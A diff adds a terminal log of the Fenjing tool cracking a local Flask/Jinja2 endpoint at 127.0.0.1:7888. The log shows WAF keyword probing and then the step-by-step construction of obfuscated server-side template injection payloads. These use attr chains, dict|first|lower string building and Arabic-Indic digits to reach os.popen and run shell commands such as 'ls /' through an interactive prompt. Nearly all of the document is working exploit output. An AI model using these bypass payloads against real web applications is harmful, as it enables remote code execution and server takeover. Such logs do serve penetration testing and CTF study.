@@ -1,0 +1,484 @@
+➜  Fenjing git:(dev) ✗ python -m fenjing scan --url 'http://127.0.0.1:7888/secr3ttt' --interval 0.02
+    ____             _ _
+   / __/__  ____    (_|_)___  ____ _
+  / /_/ _ \/ __ \  / / / __ \/ __ `/
+ / __/  __/ / / / / / / / / / /_/ /
+/_/  \___/_/ /_/_/ /_/_/ /_/\__, /
+              /___/        /____/
+
+    ------Made with passion by Marven11
+WARNING:[scan_url] | Start scanning
+WARNING:[scan_url] | Bursting 3 params...
+WARNING:[scan_url] | Found get params with burst: {'klf'}
+WARNING:[cli] | Scan form: {'action': '/secr3ttt', 'method': 'GET', 'inputs': {'klf'}}
+INFO:[cracker] | Target is python3
+INFO:[cracker] | Cracking...
+INFO:[waf_func_gen] | Testing dangerous keyword 'sbsm37sbsm'
+INFO:[waf_func_gen] | Testing dangerous keyword 'sbsm8sbsm'
+INFO:[waf_func_gen] | Testing dangerous keyword 'rhumsubclassesrhum'
+INFO:[waf_func_gen] | Testing dangerous keyword 'rhumforrhum'
+INFO:[waf_func_gen] | Testing dangerous keyword 'rhumargrhum'
+INFO:[waf_func_gen] | Testing dangerous keyword 'rhumindexrhum'
+INFO:[waf_func_gen] | Testing dangerous keyword 'rhum\\urhum'
+INFO:[waf_func_gen] | Testing dangerous keyword 'rhum),)rhum'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiisystemeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiisubprocesseyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiattreyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiinoteyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiirangeeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii2eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii0"eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiilengtheyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiinamespaceeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii7eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii]eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii\\xeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiichreyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiflashedeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii\\eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiconfigeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii"eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiifeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiglobaleyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiopeneyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiurl_foreyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiclasseyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii}}eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiibuiltinseyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii{{eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii0eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii1eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii5eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiimporteyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiurleyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiselfeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiappeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiirequesteyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiicateyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiiniteyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii4eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii.eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiordeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii3eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii+eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiget_flashed_messageseyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiiincludeeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii_eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword "eyii'eyii"
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii%eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii|eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiibaseeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiigetitemeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiioseyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiipopeyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyiidicteyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii))eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'eyii=eyii'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iodsenviods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iodsposixiods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iodsreadiods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iodspopeniods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iods~iods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iodscountiods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iods[iods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iodsmroiods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iodscdiods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iodsvalueiods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'iods9iods'
+INFO:[waf_func_gen] | Testing dangerous keyword 'zbcoglobalszbco'
+INFO:[waf_func_gen] | Testing dangerous keyword 'zbcoevalzbco'
+INFO:[waf_func_gen] | Testing dangerous keyword 'zbco6zbco'
+INFO:[waf_func_gen] | Testing dangerous keyword 'zbcoflagzbco'
+INFO:[waf_func_gen] | Testing dangerous keyword 'zbcolipsumzbco'
+INFO:[waf_func_gen] | Testing dangerous keyword 'zbcoexeczbco'
+INFO:[waf_func_gen] | Testing dangerous keyword '378378'
+INFO:[waf_func_gen] | Testing dangerous keyword 'subclassesforsubclassesfor'
+INFO:[waf_func_gen] | Testing dangerous keyword 'argindexargindex'
+INFO:[waf_func_gen] | Testing dangerous keyword '\\u),)\\u),)'
+INFO:[waf_func_gen] | Testing dangerous keyword 'systemsubprocesssystemsubprocess'
+INFO:[waf_func_gen] | Testing dangerous keyword 'attrnotattrnot'
+INFO:[waf_func_gen] | Testing dangerous keyword 'range2range2'
+INFO:[waf_func_gen] | Testing dangerous keyword '0"length0"length'
+INFO:[waf_func_gen] | Testing dangerous keyword 'namespace7namespace7'
+INFO:[waf_func_gen] | Testing dangerous keyword ']\\x]\\x'
+INFO:[waf_func_gen] | Testing dangerous keyword 'chrflashedchrflashed'
+INFO:[waf_func_gen] | Testing dangerous keyword '\\config\\config'
+INFO:[waf_func_gen] | Testing dangerous keyword '"if"if'
+INFO:[waf_func_gen] | Testing dangerous keyword 'globalopenglobalopen'
+INFO:[waf_func_gen] | Testing dangerous keyword 'url_forclassurl_forclass'
+INFO:[waf_func_gen] | Testing dangerous keyword '}}builtins}}builtins'
+INFO:[waf_func_gen] | Testing dangerous keyword '{{0{{0'
+INFO:[waf_func_gen] | Testing dangerous keyword '1515'
+INFO:[waf_func_gen] | Testing dangerous keyword 'importurlimporturl'
+INFO:[waf_func_gen] | Testing dangerous keyword 'selfappselfapp'
+INFO:[waf_func_gen] | Testing dangerous keyword 'requestcatrequestcat'
+INFO:[waf_func_gen] | Testing dangerous keyword 'init4init4'
+INFO:[waf_func_gen] | Testing dangerous keyword '.ord.ord'
+INFO:[waf_func_gen] | Testing dangerous keyword '3+3+'
+INFO:[waf_func_gen] | Testing dangerous keyword 'get_flashed_messagesincludeget_flashed_messagesinclude'
+INFO:[waf_func_gen] | Testing dangerous keyword "_'_'"
+INFO:[waf_func_gen] | Testing dangerous keyword '%|%|'
+INFO:[waf_func_gen] | Testing dangerous keyword 'basegetitembasegetitem'
+INFO:[waf_func_gen] | Testing dangerous keyword 'ospopospop'
+INFO:[waf_func_gen] | Testing dangerous keyword 'dict))dict))'
+INFO:[waf_func_gen] | Testing dangerous keyword '=env=env'
+INFO:[waf_func_gen] | Testing dangerous keyword 'posixreadposixread'
+INFO:[waf_func_gen] | Testing dangerous keyword 'popen~popen~'
+INFO:[waf_func_gen] | Testing dangerous keyword 'count[count['
+INFO:[waf_func_gen] | Testing dangerous keyword 'mrocdmrocd'
+INFO:[waf_func_gen] | Testing dangerous keyword 'value9value9'
+INFO:[waf_func_gen] | Testing dangerous keyword 'globalsevalglobalseval'
+INFO:[waf_func_gen] | Testing dangerous keyword '6flag6flag'
+INFO:[waf_func_gen] | Testing dangerous keyword 'lipsumexeclipsumexec'
+INFO:[waf_func_gen] | Testing dangerous keyword '3737'
+INFO:[waf_func_gen] | Testing dangerous keyword '88'
+INFO:[waf_func_gen] | Testing dangerous keyword 'subclassessubclasses'
+INFO:[waf_func_gen] | Testing dangerous keyword 'forfor'
+INFO:[waf_func_gen] | Testing dangerous keyword 'argarg'
+INFO:[waf_func_gen] | Testing dangerous keyword 'indexindex'
+INFO:[waf_func_gen] | Testing dangerous keyword '\\u\\u'
+INFO:[waf_func_gen] | Testing dangerous keyword '),)),)'
+INFO:[waf_func_gen] | Testing dangerous keyword 'systemsystem'
+INFO:[waf_func_gen] | Testing dangerous keyword 'subprocesssubprocess'
+INFO:[waf_func_gen] | Testing dangerous keyword 'attrattr'
+INFO:[waf_func_gen] | Testing dangerous keyword 'notnot'
+INFO:[waf_func_gen] | Testing dangerous keyword 'rangerange'
+INFO:[waf_func_gen] | Testing dangerous keyword '22'
+INFO:[waf_func_gen] | Testing dangerous keyword '0"0"'
+INFO:[waf_func_gen] | Testing dangerous keyword 'lengthlength'
+INFO:[waf_func_gen] | Testing dangerous keyword 'namespacenamespace'
+INFO:[waf_func_gen] | Testing dangerous keyword '77'
+INFO:[waf_func_gen] | Testing dangerous keyword ']]'
+INFO:[waf_func_gen] | Testing dangerous keyword '\\x\\x'
+INFO:[waf_func_gen] | Testing dangerous keyword 'chrchr'
+INFO:[waf_func_gen] | Testing dangerous keyword 'flashedflashed'
+INFO:[waf_func_gen] | Testing dangerous keyword '\\\\'
+INFO:[waf_func_gen] | Testing dangerous keyword 'configconfig'
+INFO:[waf_func_gen] | Testing dangerous keyword '""'
+INFO:[waf_func_gen] | Testing dangerous keyword 'ifif'
+INFO:[waf_func_gen] | Testing dangerous keyword 'globalglobal'
+INFO:[waf_func_gen] | Testing dangerous keyword 'openopen'
+INFO:[waf_func_gen] | Testing dangerous keyword 'url_forurl_for'
+INFO:[waf_func_gen] | Testing dangerous keyword 'classclass'
+INFO:[waf_func_gen] | Testing dangerous keyword '}}}}'
+INFO:[waf_func_gen] | Testing dangerous keyword 'builtinsbuiltins'
+INFO:[waf_func_gen] | Testing dangerous keyword '{{{{'
+INFO:[waf_func_gen] | Testing dangerous keyword '00'
+INFO:[waf_func_gen] | Testing dangerous keyword '11'
+INFO:[waf_func_gen] | Testing dangerous keyword '55'
+INFO:[waf_func_gen] | Testing dangerous keyword 'importimport'
+INFO:[waf_func_gen] | Testing dangerous keyword 'urlurl'
+INFO:[waf_func_gen] | Testing dangerous keyword 'selfself'
+INFO:[waf_func_gen] | Testing dangerous keyword 'appapp'
+INFO:[waf_func_gen] | Testing dangerous keyword 'requestrequest'
+INFO:[waf_func_gen] | Testing dangerous keyword 'catcat'
+INFO:[waf_func_gen] | Testing dangerous keyword 'initinit'
+INFO:[waf_func_gen] | Testing dangerous keyword '44'
+INFO:[waf_func_gen] | Testing dangerous keyword '..'
+INFO:[waf_func_gen] | Testing dangerous keyword 'ordord'
+INFO:[waf_func_gen] | Testing dangerous keyword '33'
+INFO:[waf_func_gen] | Testing dangerous keyword '++'
+INFO:[waf_func_gen] | Testing dangerous keyword 'get_flashed_messagesget_flashed_messages'
+INFO:[waf_func_gen] | Testing dangerous keyword 'includeinclude'
+INFO:[waf_func_gen] | Testing dangerous keyword '__'
+INFO:[waf_func_gen] | Testing dangerous keyword "''"
+INFO:[waf_func_gen] | Testing dangerous keyword '%%'
+INFO:[waf_func_gen] | Testing dangerous keyword '||'
+INFO:[waf_func_gen] | Testing dangerous keyword 'basebase'
+INFO:[waf_func_gen] | Testing dangerous keyword 'getitemgetitem'
+INFO:[waf_func_gen] | Testing dangerous keyword 'osos'
+INFO:[waf_func_gen] | Testing dangerous keyword 'poppop'
+INFO:[waf_func_gen] | Testing dangerous keyword 'dictdict'
+INFO:[waf_func_gen] | Testing dangerous keyword '))))'
+INFO:[waf_func_gen] | Testing dangerous keyword '=='
+INFO:[waf_func_gen] | Testing dangerous keyword 'envenv'
+INFO:[waf_func_gen] | Testing dangerous keyword 'posixposix'
+INFO:[waf_func_gen] | Testing dangerous keyword 'readread'
+INFO:[waf_func_gen] | Testing dangerous keyword 'popenpopen'
+INFO:[waf_func_gen] | Testing dangerous keyword '~~'
+INFO:[waf_func_gen] | Testing dangerous keyword 'countcount'
+INFO:[waf_func_gen] | Testing dangerous keyword '[['
+INFO:[waf_func_gen] | Testing dangerous keyword 'mromro'
+INFO:[waf_func_gen] | Testing dangerous keyword 'cdcd'
+INFO:[waf_func_gen] | Testing dangerous keyword 'valuevalue'
+INFO:[waf_func_gen] | Testing dangerous keyword '99'
+INFO:[waf_func_gen] | Testing dangerous keyword 'globalsglobals'
+INFO:[waf_func_gen] | Testing dangerous keyword 'evaleval'
+INFO:[waf_func_gen] | Testing dangerous keyword '66'
+INFO:[waf_func_gen] | Testing dangerous keyword 'flagflag'
+INFO:[waf_func_gen] | Testing dangerous keyword 'lipsumlipsum'
+INFO:[waf_func_gen] | Testing dangerous keyword 'execexec'
+INFO:[waf_func_gen] | Testing long payloads...
+INFO:[full_payload_gen] | use {{PAYLOAD}}
+INFO:[full_payload_gen] | Adding some string variables...
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('%c') can be (prrc,dict(c=x)|join)|join
+INFO:[full_payload_gen] | Adding '%c' with {%set fa=(prrc,dict(c=x)|join)|join%}
+INFO:[payload_gen] | failed generating string_concatmany([('expression', 10, [('literal', 'dict(__=x)|join')])]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__globals__'), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('__') can be x|center(2)|replace(x|center|first,fa)%(95,95)
+INFO:[full_payload_gen] | Adding '__' with {%set ci=x|center(2)|replace(x|center|first,fa)%(95,95)%}
+INFO:[payload_gen] | Great, string('class') can be dict(CLASS=x)|first|lower
+INFO:[full_payload_gen] | Adding 'class' with {%set cl=dict(CLASS=x)|first|lower%}
+INFO:[payload_gen] | Great, string('globals') can be dict(GLOBALS=x)|first|lower
+INFO:[full_payload_gen] | Adding 'globals' with {%set gl=dict(GLOBALS=x)|first|lower%}
+INFO:[payload_gen] | Great, string('init') can be dict(INIT=x)|first|lower
+INFO:[full_payload_gen] | Adding 'init' with {%set in=dict(INIT=x)|first|lower%}
+INFO:[payload_gen] | Great, string('dict') can be dict(DICT=x)|first|lower
+INFO:[full_payload_gen] | Adding 'dict' with {%set di=dict(DICT=x)|first|lower%}
+INFO:[payload_gen] | Great, string('builtins') can be dict(BUILTINS=x)|first|lower
+INFO:[full_payload_gen] | Adding 'builtins' with {%set bu=dict(BUILTINS=x)|first|lower%}
+INFO:[payload_gen] | Great, string('getitem') can be dict(GETITEM=x)|first|lower
+INFO:[full_payload_gen] | Adding 'getitem' with {%set ge=dict(GETITEM=x)|first|lower%}
+INFO:[payload_gen] | Great, string('import') can be dict(IMPORT=x)|first|lower
+INFO:[full_payload_gen] | Adding 'import' with {%set im=dict(IMPORT=x)|first|lower%}
+INFO:[payload_gen] | Great, string('add') can be dict(ADD=x)|first|lower
+INFO:[full_payload_gen] | Adding 'add' with {%set ad=dict(ADD=x)|first|lower%}
+INFO:[payload_gen] | Great, string('mul') can be dict(MUL=x)|first|lower
+INFO:[full_payload_gen] | Adding 'mul' with {%set mu=dict(MUL=x)|first|lower%}
+INFO:[payload_gen] | Great, string('mod') can be dict(MOD=x)|first|lower
+INFO:[full_payload_gen] | Adding 'mod' with {%set mo=dict(MOD=x)|first|lower%}
+INFO:[payload_gen] | Great, string('os') can be dict(OS=x)|first|lower
+INFO:[full_payload_gen] | Adding 'os' with {%set jm=dict(OS=x)|first|lower%}
+INFO:[payload_gen] | Great, string('popen') can be dict(POPEN=x)|first|lower
+INFO:[full_payload_gen] | Adding 'popen' with {%set po=dict(POPEN=x)|first|lower%}
+INFO:[payload_gen] | Great, string('read') can be dict(READ=x)|first|lower
+INFO:[full_payload_gen] | Adding 'read' with {%set re=dict(READ=x)|first|lower%}
+INFO:[payload_gen] | Great, string('pop') can be dict(POP=x)|first|lower
+INFO:[full_payload_gen] | Adding 'pop' with {%set fh=dict(POP=x)|first|lower%}
+INFO:[payload_gen] | Great, string('get') can be dict(GET=x)|first|lower
+INFO:[full_payload_gen] | Adding 'get' with {%set gt=dict(GET=x)|first|lower%}
+INFO:[payload_gen] | Great, string('eval') can be dict(EVAL=x)|first|lower
+INFO:[full_payload_gen] | Adding 'eval' with {%set ev=dict(EVAL=x)|first|lower%}
+INFO:[payload_gen] | Great, string('bytes') can be dict(BYTES=x)|first|lower
+INFO:[full_payload_gen] | Adding 'bytes' with {%set by=dict(BYTES=x)|first|lower%}
+INFO:[payload_gen] | Great, string('decode') can be dict(DECODE=x)|first|lower
+INFO:[full_payload_gen] | Adding 'decode' with {%set de=dict(DECODE=x)|first|lower%}
+INFO:[payload_gen] | Great, string('chr') can be dict(CHR=x)|first|lower
+INFO:[full_payload_gen] | Adding 'chr' with {%set ch=dict(CHR=x)|first|lower%}
+INFO:[payload_gen] | Great, string('truediv') can be dict(TRUEDIV=x)|first|lower
+INFO:[full_payload_gen] | Adding 'truediv' with {%set tr=dict(TRUEDIV=x)|first|lower%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'class'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('class') can be cl
+INFO:[payload_gen] | Great, string('__class__') can be (ndll,ndll,cl,ndll,ndll)|join
+INFO:[full_payload_gen] | Adding '__class__' with {%set ca=(ndll,ndll,cl,ndll,ndll)|join%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'globals'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('globals') can be gl
+INFO:[payload_gen] | Great, string('__globals__') can be (ndll,ndll,gl,ndll,ndll)|join
+INFO:[full_payload_gen] | Adding '__globals__' with {%set go=(ndll,ndll,gl,ndll,ndll)|join%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'init'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('init') can be in
+INFO:[payload_gen] | Great, string('__init__') can be (ndll,ndll,in,ndll,ndll)|join
+INFO:[full_payload_gen] | Adding '__init__' with {%set ii=(ndll,ndll,in,ndll,ndll)|join%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'dict'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('dict') can be di
+INFO:[payload_gen] | Great, string('__dict__') can be (ndll,ndll,di,ndll,ndll)|join
+INFO:[full_payload_gen] | Adding '__dict__' with {%set dc=(ndll,ndll,di,ndll,ndll)|join%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'builtins'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('builtins') can be bu
+INFO:[payload_gen] | Great, string('__builtins__') can be (ndll,ndll,bu,ndll,ndll)|join
+INFO:[full_payload_gen] | Adding '__builtins__' with {%set bi=(ndll,ndll,bu,ndll,ndll)|join%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'getitem'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('getitem') can be ge
+INFO:[payload_gen] | Great, string('__getitem__') can be (ndll,ndll,ge,ndll,ndll)|join
+INFO:[full_payload_gen] | Adding '__getitem__' with {%set gi=(ndll,ndll,ge,ndll,ndll)|join%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'import'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('import') can be im
+INFO:[payload_gen] | Great, string('__import__') can be (ndll,ndll,im,ndll,ndll)|join
+INFO:[full_payload_gen] | Adding '__import__' with {%set ip=(ndll,ndll,im,ndll,ndll)|join%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'add'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating variable_of('__add__'), it might not be an issue.
+INFO:[payload_gen] | Great, string('add') can be ad
+INFO:[payload_gen] | Great, string('__add__') can be (ndll,ndll,ad,ndll,ndll)|join
+INFO:[full_payload_gen] | Adding '__add__' with {%set cq=(ndll,ndll,ad,ndll,ndll)|join%}
+INFO:[payload_gen] | failed generating variable_of('__mul__'), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'mul'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | Great, string('mul') can be mu
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_underline',), ('string_underline',))), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_concat', ('string_underline',), ('string_underline',)), ('string', 'mul'))), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_concat', ('string_concat', ('string_underline',), ('string_underline',)), ('string', 'mul')), ('string_underline',))), it might not be an issue.
+INFO:[payload_gen] | Great, string('__mul__') can be ndll|attr(cq)(ndll)|attr(cq)(mu)|attr(cq)(ndll)|attr(cq)(ndll)
+INFO:[full_payload_gen] | Adding '__mul__' with {%set ml=ndll|attr(cq)(ndll)|attr(cq)(mu)|attr(cq)(ndll)|attr(cq)(ndll)%}
+INFO:[payload_gen] | Great, string('mod') can be mo
+INFO:[payload_gen] | failed generating enclose(('multiply', ('string_underline',), ('integer', 2))), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('multiply', ('string_underline',), ('integer', 2)), ('string', 'mod'))), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'mod'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_underline',), ('string_underline',))), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_concat', ('string_underline',), ('string_underline',)), ('string', 'mod'))), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_concat', ('string_concat', ('string_underline',), ('string_underline',)), ('string', 'mod')), ('string_underline',))), it might not be an issue.
+INFO:[payload_gen] | Great, string('__mod__') can be ndll|attr(cq)(ndll)|attr(cq)(mo)|attr(cq)(ndll)|attr(cq)(ndll)
+INFO:[full_payload_gen] | Adding '__mod__' with {%set md=ndll|attr(cq)(ndll)|attr(cq)(mo)|attr(cq)(ndll)|attr(cq)(ndll)%}
+INFO:[payload_gen] | Great, string('truediv') can be tr
+INFO:[payload_gen] | failed generating enclose(('multiply', ('string_underline',), ('integer', 2))), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('multiply', ('string_underline',), ('integer', 2)), ('string', 'truediv'))), it might not be an issue.
+INFO:[payload_gen] | failed generating string_concatmany([('multiply', ('string_underline',), ('integer', 2)), ('string', 'truediv'), ('multiply', ('string_underline',), ('integer', 2))]), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_underline',), ('string_underline',))), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_concat', ('string_underline',), ('string_underline',)), ('string', 'truediv'))), it might not be an issue.
+INFO:[payload_gen] | failed generating enclose(('string_concat', ('string_concat', ('string_concat', ('string_underline',), ('string_underline',)), ('string', 'truediv')), ('string_underline',))), it might not be an issue.
+INFO:[payload_gen] | Great, string('__truediv__') can be ndll|attr(cq)(ndll)|attr(cq)(tr)|attr(cq)(ndll)|attr(cq)(ndll)
+INFO:[full_payload_gen] | Adding '__truediv__' with {%set tu=ndll|attr(cq)(ndll)|attr(cq)(tr)|attr(cq)(ndll)|attr(cq)(ndll)%}
+INFO:[payload_gen] | Great, string('%c') can be fa
+INFO:[full_payload_gen] | Adding '%c' with {%set js=fa%}
+INFO:[payload_gen] | Great, integer(101) can be 1٠١
+INFO:[payload_gen] | Great, integer(99) can be 9٩
+INFO:[payload_gen] | Great, integer(104) can be 1٠٤
+INFO:[payload_gen] | Great, integer(102) can be 1٠٢
+INFO:[payload_gen] | Great, integer(51) can be 5١
+INFO:[payload_gen] | Great, integer(110) can be 1١٠
+INFO:[payload_gen] | Great, integer(106) can be 1٠٦
+INFO:[payload_gen] | Great, integer(49) can be 4٩
+INFO:[payload_gen] | Great, integer(103) can be 1٠٣
+INFO:[payload_gen] | Great, integer(59) can be 5٩
+INFO:[payload_gen] | Great, string('echo f3n  j1ng;') can be lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((1٠١,9٩,1٠٤,111,32,1٠٢,5١,1١٠,32,32,1٠٦,4٩,1١٠,1٠٣,5٩),)|attr(de)()
+INFO:[full_payload_gen] | Adding 'echo f3n  j1ng;' with {%set ec=lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((1٠١,9٩,1٠٤,111,32,1٠٢,5١,1١٠,32,32,1٠٦,4٩,1١٠,1٠٣,5٩),)|attr(de)()%}
+INFO:[full_payload_gen] | Start generating final expression...
+INFO:[payload_gen] | Great, string('__globals__') can be go
+INFO:[payload_gen] | failed generating enclose(('attribute', ('jinja_context_var', 'lipsum'), '__globals__')), it might not be an issue.
+INFO:[payload_gen] | Great, string('__getitem__') can be gi
+INFO:[payload_gen] | Great, string('__builtins__') can be bi
+INFO:[payload_gen] | failed generating enclose(('item', ('attribute', ('jinja_context_var', 'lipsum'), '__globals__'), '__builtins__')), it might not be an issue.
+INFO:[payload_gen] | Great, string('__import__') can be ip
+INFO:[payload_gen] | Great, string('os') can be jm
+INFO:[payload_gen] | Great, we generate module_os()
+INFO:[payload_gen] | Great, string('popen') can be po
+INFO:[payload_gen] | Great, string('echo f3n  j1ng;') can be ec
+INFO:[payload_gen] | Great, we generate os_popen_obj('echo f3n  j1ng;')
+INFO:[payload_gen] | Great, string('read') can be re
+INFO:[payload_gen] | Great, we generate os_popen_read('echo f3n  j1ng;')
+INFO:[cracker] | Testing generated payload.
+INFO:[cracker] | Success! Now we can generate payloads.
+Example/示例:
+$>> ls /
+$>> @eval 1+2+3+100000
+$>> @get-config
+Type @help for full help/输入@help获得完整帮助
+$>> ls /
+INFO:[full_payload_gen] | Start generating final expression...
+INFO:[payload_gen] | Great, integer(108) can be 1٠٨
+INFO:[payload_gen] | Great, integer(47) can be 4٧
+INFO:[payload_gen] | Great, string('ls /') can be lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((1٠٨,115,32,4٧),)|attr(de)()
+INFO:[payload_gen] | Great, we generate os_popen_obj('ls /')
+INFO:[payload_gen] | Great, we generate os_popen_read('ls /')
